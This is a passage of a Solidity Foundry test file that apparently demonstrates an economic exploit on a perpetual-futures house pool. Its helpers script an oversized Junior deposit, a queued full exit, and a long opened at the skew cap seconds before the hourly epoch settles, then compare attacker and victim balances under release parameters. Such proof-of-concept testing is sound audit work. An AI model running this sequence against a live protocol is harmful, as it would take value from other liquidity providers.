        bool openPosition
    ) internal returns (uint256 settleTime) {
        // Step 1. Deposit into Junior. Free cash caps the size of an exit, so the deposit is 1.475 times the rest of
        //         the pool. The deposit activates when the next hourly epoch settles.
        _depositJunior(ATTACKER_LP, (pool.totalAssets() * 1475) / 1000);

        // Step 2. After the one-hour cooldown, queue the exit of all shares for the next epoch.
        vm.warp(vm.getBlockTimestamp() + 1 hours + 10);
        uint256 exitId;
        (exitId, settleTime) = _queueFullExit(ATTACKER_LP);

        // Step 3. Attack run only: open at the 40% skew cap 30 seconds before the hour.
        uint256 lots;
        if (openPosition) {
            vm.warp(settleTime - 30);
            lots = (_poolDepth() * 4) / 10 / 100e6;
            _openLong(ATTACKER_TRADER, lots);
        }

        // Steps 4 and 5. Anyone settles the epoch at the hour, then the attacker claims the exit.
        _settleLpEpochAt(settleTime);
        assertEq(juniorVault.pendingRedeemRequest(exitId, ATTACKER_LP), 0, "every exit must be funded in full");
        _claimExit(ATTACKER_LP);

        // Step 6. Attack run only: close the position and take back `V` less the close fee.
        if (openPosition) {
            _closeLong(ATTACKER_TRADER, lots);
        }
    }

    /// @dev Commits a long through the Router, then executes it with a fresh Pyth price of 1.00, as a keeper would.
    ///      Margin is 1% of notional; one lot is 100 tokens, so $100 at price 1.00.
    function _openLong(
        address trader,
        uint256 lots
    ) internal {
        vm.prank(trader);
        uint64 orderId =
            router.commitOrder(CfdTypes.Side.LONG, lots * CfdTypes.SIZE_QUANTUM, (lots * 100e6) / 100, 0, false);
        bytes[] memory priceUpdate = _mockPythUpdateData(1e8);
        vm.prank(trader);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, priceUpdate);
        assertEq(uint256(result.status), uint256(OrderV3Types.LifecycleStatus.Executed), "the open must execute");
    }

    /// @dev Commits a close of `lots` through the Router, then executes it with a fresh Pyth price of 1.00.
    function _closeLong(
        address trader,
        uint256 lots
    ) internal {
        vm.prank(trader);
        uint64 orderId = router.commitOrder(CfdTypes.Side.LONG, lots * CfdTypes.SIZE_QUANTUM, 0, 0, true);
        bytes[] memory priceUpdate = _mockPythUpdateData(1e8);
        vm.prank(trader);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, priceUpdate);
        assertEq(uint256(result.status), uint256(OrderV3Types.LifecycleStatus.Executed), "the close must execute");
    }

    /// @dev Requests a Junior deposit, lets the next hourly epoch activate it, then claims the shares.
    function _depositJunior(
        address lp,
        uint256 amount
    ) internal {
        vm.startPrank(lp);
        settlementToken.approve(address(juniorVault), amount);
        uint256 depositId = juniorVault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
        _settleLpEpochAt(pool.lpEpochStart(depositId));
        vm.prank(lp);
        juniorVault.claimDepositShares(depositId);
    }

    /// @dev Queues a redemption of all of `lp`'s Junior shares.
    /// @return exitId The redemption request id.
    /// @return settleTime The hour at which the request is priced and funded.
    function _queueFullExit(
        address lp
    ) internal returns (uint256 exitId, uint256 settleTime) {
        uint256 shares = juniorVault.balanceOf(lp);
        vm.prank(lp);
        exitId = juniorVault.requestRedeem(shares, lp, lp);
        settleTime = pool.lpEpochStart(exitId);
    }

    /// @dev Claims every share of `lp`'s funded redemption, which pays its USDG to `lp`.
    function _claimExit(
        address lp
    ) internal {
        uint256 claimable = juniorVault.maxRedeem(lp);
        vm.prank(lp);
        juniorVault.redeem(claimable, lp, lp);
    }

    /// @dev Moves to `time` and settles the LP epoch through the public Router entry, as any keeper can.
    function _settleLpEpochAt(
        uint256 time
    ) internal {
        vm.warp(time);
        router.settleLpEpoch(_mockPythUpdateData(1e8));
    }

    /// @dev Pool depth as the VPI curve uses it: pool assets minus trader claims.
    function _poolDepth() internal view returns (uint256) {
        return pool.totalAssets() - engine.totalTraderClaimBalanceAssets();
    }

    /// @dev Value of `lp`'s Junior shares at the current Junior share price.
    function _juniorValue(
        address lp
    ) internal view returns (uint256) {
        return juniorVault.convertToAssets(juniorVault.balanceOf(lp));
    }

    function _readBalances() internal view returns (Balances memory b) {
        b.attackerLpCash = settlementToken.balanceOf(ATTACKER_LP);
        b.attackerTraderBalance = clearinghouse.balanceAssets(ATTACKER_TRADER);
        b.victimJunior = _juniorValue(address(this));
        b.seniorAssets = seniorVault.totalAssets();
        b.treasury = clearinghouse.balanceAssets(engine.protocolTreasury());
    }

    /// @dev Signed difference `afterValue - beforeValue`.
    function _change(
        uint256 afterValue,
        uint256 beforeValue
    ) internal pure returns (int256) {
        return int256(afterValue) - int256(beforeValue);
    }

    /// @dev Warps to the next Sunday 22:00 UTC, just after the weekly FX reopen. Unix time 0 was a Thursday, so
    ///      `t - 3 days` counts whole weeks from a Sunday.
    function _warpToSundayEvening() internal {
        vm.warp(((vm.getBlockTimestamp() - 3 days) / 1 weeks + 1) * 1 weeks + 3 days + 22 hours);
    }

    /// @dev Release values from packages/perps/DEPLOYMENT.md, set through the real 72-hour timelocks. The fixture
    ///      deploys with vpiFactor 0 and no Senior cap. Execution fee and settlement buffer are already 4 and 25 bps.
    function _applyReleaseParameters() internal {
        ICfdEngineAdminHost.EngineRiskConfig memory riskConfig = _engineRiskConfig();
        riskConfig.riskParams.vpiFactor = 0.01e18;
        riskConfig.riskParams.maxSkewRatio = 0.4e18;
        riskConfig.riskParams.maintMarginBps = 10;
        riskConfig.riskParams.initMarginBps = 20;
        engineAdmin.proposeRiskConfig(riskConfig);
        IOrderRouterAdminHost.RouterConfig memory routerConfig = _routerConfig();
        routerConfig.adverseConfidenceMultiplierBps = 2500;
        routerAdmin.proposeRouterConfig(routerConfig);
        IHousePool.PoolConfig memory poolConfig = _currentPoolConfig();
        poolConfig.maxSeniorExposureAssets = 40_000_000e6;
        poolConfig.maxSeniorShareBps = 8000;
        pool.proposePoolConfig(poolConfig);
        vm.warp(vm.getBlockTimestamp() + 72 hours + 1);
        engineAdmin.finalizeRiskConfig();
        routerAdmin.finalizeRouterConfig();
        pool.finalizePoolConfig();
        assertEq(engine.executionFeeBps(), 4, "release execution fee is 4 bps");
        assertEq(engine.settlementBufferBps(), 25, "release settlement buffer is 25 bps");
        assertFalse(engine.isOracleFrozen(), "the market must be live");
        assertFalse(engine.isFadWindow(), "the market must not be in the FAD window");
    }

}

```
